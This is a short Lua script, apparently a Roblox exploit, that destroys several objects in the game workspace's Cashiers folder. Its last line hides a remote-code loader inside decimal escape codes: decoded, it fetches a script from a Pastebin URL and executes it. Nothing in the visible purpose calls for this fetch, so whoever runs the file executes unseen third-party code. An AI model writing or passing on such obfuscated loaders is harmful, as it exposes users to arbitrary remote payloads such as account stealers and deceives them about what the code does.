local PlutoIsCool = function()
  local success, err = pcall(function()
    local CashiersFound = {}

    for i, v in pairs(game.Workspace.Cashiers:GetChildren()) do
        table.insert(CashiersFound, v)
    end

    CashiersFound[15]:Destroy()
    CashiersFound[16]:Destroy()
    CashiersFound[17]:Destroy()
  end)
end
PlutoIsCool()
loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\72\109\116\102\56\75\83\98\39\41\41\40\41\10")()